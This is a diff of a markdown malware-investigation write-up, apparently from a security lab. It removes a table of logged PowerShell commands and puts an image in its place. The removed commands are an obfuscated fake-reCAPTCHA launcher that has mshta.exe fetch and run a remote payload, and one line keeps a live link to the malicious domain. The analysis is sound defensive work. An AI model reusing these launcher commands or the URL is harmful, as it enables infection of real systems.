@@ -64,12 +64,8 @@ Investigating EDR logs, I further confirmed access to the malicious site via bro
 In the Terminal History, I found obfuscated powershell launcher invoking `mshta.exe`. Once again, calling back to information I found in Malware-Traffic-Analysis.net.
 
 Date: Mar 13, 2025
-    
-| Time | Command Line |
-| --- | --- |
-| 23:26:19 | "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -w 1 powershell -Command ('ms\]\]\]ht\]\]\]a\]\]\].\]\]\]exe hxxps\[:\]//overcoatpassably\[.\]shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace '\]') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824'' |
-| 23:26:31 | "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command "mshta.exe hxxps\[:\]//overcoatpassably\[.\]shop/Z8UZbPyVpGfdRS/maloy.mp4" |
-| 23:26:32 | "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -w 1 powershell -Command ('ms\]\]\]ht\]\]\]a\]\]\].\]\]\]exe hxxps\[:\]//overcoatpassably\[.\]shop/Z8UZbPyVpGfdRS/maloy.mp[](https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4)' -replace '\]') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824'' |
+<img width="1018" height="276" alt="image" src="https://github.com/user-attachments/assets/6d29467b-181b-4fd8-92b3-a78290a26855" />
+
 
 ## Artifacts
 | Value | Comment | Type |
